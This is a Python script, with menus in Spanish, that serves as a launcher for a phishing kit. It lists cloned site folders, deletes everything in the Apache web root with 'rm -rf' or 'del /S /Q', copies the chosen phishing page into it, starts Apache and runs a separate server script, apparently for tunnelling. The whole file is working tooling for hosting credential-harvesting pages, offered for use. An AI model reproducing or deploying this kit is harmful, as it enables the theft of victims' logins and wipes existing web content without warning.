import os
import signal
import subprocess


def sistema_operativo():
        print("1) Windows")
        print("2) Linux")
        return int(input("Ingresa tu opción: "))

sistema = sistema_operativo()

try:
    def menu(): 
        print("1) Instalar")
        print("2) Página de phishing")
        print("3) Salir")
        return int(input("Ingresa tu opción: "))

    def instalar(): 
        print("1) Windows")
        print("2) Linux")
        if int(input("Ingresa tu opción: ")) == 1:
            os.system(".\\scripts\\install_windows.bat")
        else:
            os.system("sudo apt install apache2 -y && sudo pip install -r requirments.txt")
        main()

    def menu_phishing():
        carpetas = next(os.walk('sites'))[1]
        for i, carpeta in enumerate(carpetas, start=1):
            print(f"{i}) {carpeta}")
        return carpetas[int(input("Ingresa tu opción: ")) - 1]


    def inicio_phishing_windows(carpeta):
        try:
            os.system(f"cd sites/{carpeta}")
            print("Iniciando el servidor...")
            os.system("cd C:\\Apache24\\htdocs\\")
            os.system("del /S /Q C:\\Apache24\\htdocs\\*") 
            os.system(f"xcopy /E /I sites\\{carpeta}\\* C:\\Apache24\\htdocs\\")
            os.system("NET START Apache2.4")
            

            print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
        except Exception as e:
            print(f"Se produjo un error: {e}")

    def inicio_phishing_linux(carpeta):
        os.system(f"cd sites/{carpeta}")
        print("Iniciando el servidor...")
        os.system("sudo rm -rf /var/www/html/*")  
        os.system(f"sudo cp -r sites/{carpeta} /var/www/html/")
        os.system("sudo systemctl start apache2")

    def serveo(ruta_server): 
        if sistema == 1:
            subprocess.call(["python", ruta_server])
        elif sistema == 2:
            subprocess.call(["python", ruta_server])
        return ruta_server

    def main():
        opcion_menu = menu()
        if opcion_menu == 1:
            instalar()
        elif opcion_menu == 2:
            carpeta_elegida = menu_phishing()
            print(f"Has elegido la carpeta {carpeta_elegida}")
            ruta_server = "scripts/server.py"
            if sistema == 1:
                inicio_phishing_windows(carpeta_elegida)
                serveo(ruta_server)
            else:
                inicio_phishing_linux(carpeta_elegida)
                serveo(ruta_server)
        else:
            print("Saliendo del programa...")
            if sistema == 1:
                os.system("NET STOP Apache2.4")  
            elif sistema == 2:  
                os.system("sudo systemctl stop apache2")
            
    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    print("\nInterrupción detectada, deteniendo el servidor Apache...")
    if sistema == 1:
                os.system("NET STOP Apache2.4")  
    elif sistema == 2:  
                os.system("sudo systemctl stop apache2")
